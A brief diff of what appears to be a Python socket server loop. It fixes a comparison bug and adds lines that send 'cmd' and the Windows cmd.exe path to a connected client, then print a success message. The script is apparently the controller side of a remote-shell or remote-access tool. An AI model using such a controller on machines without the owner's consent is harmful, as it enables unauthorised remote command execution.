@@ -102,8 +102,14 @@ while 1 :
   
   
   
-  elif command = "cmd":
-      conn.send(comand.encode())
+  elif command == "cmd":
+      conn.send(command.encode())
+      cmdpath = (str("C:\windows\system32\cmd.exe"))
+      conn.send(cmdpath.encode())
+      print("")
+      print("command as been executed successfully")
+      
+      
     
 
 
